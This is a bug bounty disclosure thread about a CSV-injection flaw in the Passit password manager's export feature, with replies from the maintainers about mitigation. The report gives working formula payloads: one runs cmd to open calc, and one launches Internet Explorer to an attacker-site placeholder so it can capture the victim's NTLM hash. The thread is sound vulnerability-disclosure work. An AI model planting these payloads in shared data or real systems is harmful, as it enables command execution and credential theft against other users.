vulnerability_information: **Summary:** CSV-injection in export functionality **Description:** Hello team! I have found that you have a CSV-injection vulnerability in export functionality. First I thought that this is just fine but because you can group up this can be used against another users which makes this pretty critical vulnerability! CSV-injection allows you to execute commands in another users machine when he/she exports the password details out of the passit.io web app. ## Steps To Reproduce: 1. Make group and join it two separate accounts (attacker and victim) 1. Now make new, "reliable", shared details to the group 1. Set to password field (or any else field - password is just the most dangerous because victim can't see it!) this value `;=2+5+cmd|' /C calc'!A0` 1. Go to the "victims" machine and export the passwords and when you try to open this csv it executes OS commands and opens the calculator: {F283888} Another way to exploit this could be like opening ie to the page where a victim tries to authentication automaticly - Use payload like this `;=6-5 cmd|' /C "C:\Program Files\Internet Explorer\iexplore.exe" http:///asd.html'!A0` where this `asd.html` contains the e.g ``. Now you just basicly stole users NTLM hash and user name :) There is lot of scenarios how an bad guy could exploit this against victims. ### How to fix? The fix can be hard in this case but because this can be used against another users I really recommend you fix this. Fix can be: - Be sure that any of password fields (site, name, password etc..) won't start with character which is used to the attack by adding character `'` before these characters `;`,`=`,`+`,`-`,`@` - You can export to `.txt` or traditional excel format - You can cut of http sites/cmd strings or something like that Here is some links as a reference: https://payatu.com/csv-injection-basic-to-exploit/ http://georgemauer.net/2017/10/07/csv-injection.html https://www.owasp.org/index.php/CSV_Injection ## Impact An attacker could execute OS commands against another users.
title: CSV-injection in export functionality

activities.message:
Good find! Another mitigation would be to have to accept group invites so that random attackers can't effectively force you to join a group. That's in our roadmap already.

https://gitlab.com/passit/passit/issues/48
https://gitlab.com/passit/passit/issues/17

So I think the fix is twofold - sanitize any data that is sharable and exportable (which as you said is hard!) and make a accept group invite experience that stresses not to accept from people you don't know. I'll read up on those links and think about csv vs other formats. Some other password managers export and import with CSV so that will have to be considered.

activities.message:
Hello

Thanks for the answer. 
Sounds great! The risk will be mitigated a lot when force joining is fixed. But still there is "untrusted" input from users point of view and this sanitaizing sounds good idea. Great!

Cheers!

Hello.

There should not be any version limitations. I tested with full patched win 10 and Excel 2016. May I see your payload? Which field you used to inject payload? If it helps I can record you a video PoC.

Cheers!

activities.message:
I had a friend try it with Office 2010 but it didn't work. Attached is my payload - I just put that string in every field. I'll have to try with 2016.

Since there's a big warning I think it's a lesser threat. Seems like Microsoft's problem but I realize users will click yes to anything without reading so I owe some due diligence here.

activities.message:
Hello!

Did you manually changed this file to the `.csv.txt`? Anyway when I opened this CSV with my excel it actually worked without any problem. Ofcourse I first checked what you did put in ;)

I think, I just think, it should work also in Office 2010 without any problem. This is kind a weird in my opinion.. Could you test with payload (e.g. password) like: `;=5+5` and see how it looks in you excel? Because if you see 10 the formula executes.

If I can do anything for you please let me know.

Cheers!

activities.message:
I've decided to lower the priority because:

- I'd consider this more a bug in MS Office
- Even Windows + MS Office users would get a scary security warning
- It's hard to reproduce and appears to require specific versions of Windows and/or Office
- Our user base is currently small and made of mostly of people I know - this skews it towards Linux and OSX
- I'd like to focus on other reports first.

Let me know if you disagree. Nothing has changed in my place to address this (accept group invites and explore escaping csv or not using csv at all)

activities.message: We are going to build out the group invites acceptance system first. Then reevaluate further action specific to csv. I think this has the most value for mitigation as it would help prevent a wide range of attacks based on sharing data between users. The invite system will probably take a couple weeks as it involves mostly design work (strictly speaking the back end already supports accepting invites there is just no frontend design to take advantage of it).

Cheers!

Okay! Thanks for the information.

Cheers

Group invite acceptance is finally live. Note private org mode still autoaccepts groups (presumably you trust your own private server). 

Further mitigation is noted here https://gitlab.com/passit/passit-frontend/issues/98 and is not implemented.

I'm going to close this ticket, let me know if you disagree. Auto accept greatly reducers the changes this could happen in the wild and next steps are in the open. Thanks for reporting.

vulnerability_information_html:
Summary:
CSV-injection in export functionality

Description:
Hello team!

I have found that you have a CSV-injection vulnerability in export functionality. First I thought that this is just fine but because you can group up this can be used against another users which makes this pretty critical vulnerability!

CSV-injection allows you to execute commands in another users machine when he/she exports the password details out of the passit.io web app.

Steps To Reproduce:

  1. Make group and join it two separate accounts (attacker and victim)
  2. Now make new, "reliable", shared details to the group
  3. Set to password field (or any else field - password is just the most dangerous because victim can't see it!) this value ;=2+5+cmd|' /C calc'!A0
  4. Go to the "victims" machine and export the passwords and when you try to open this csv it executes OS commands and opens the calculator:

Another way to exploit this could be like opening ie to the page where a victim tries to authentication automaticly - Use payload like this ;=6-5 cmd|' /C "C:\Program Files\Internet Explorer\iexplore.exe" http://<attackers site>/asd.html'!A0 where this asd.html contains the e.g <img src="file://<attackers site/t.jpg"/>. Now you just basicly stole users NTLM hash and user name :)

There is lot of scenarios how an bad guy could exploit this against victims.

How to fix?

The fix can be hard in this case but because this can be used against another users I really recommend you fix this.
Fix can be:

  • Be sure that any of password fields (site, name, password etc..) won't start with character which is used to the attack by adding character ' before these characters ;,=,+,-,@
  • You can export to .txt or traditional excel format
  • You can cut of http sites/cmd strings or something like that

Here is some links as a reference:
https://payatu.com/csv-injection-basic-to-exploit/
http://georgemauer.net/2017/10/07/csv-injection.html
https://www.owasp.org/index.php/CSV_Injection

Impact

An attacker could execute OS commands against another users.

profile.about: An open source app that uses an established and modern cryptographic library to secure your passwords online so you can access them anywhere.
profile.name: Passit
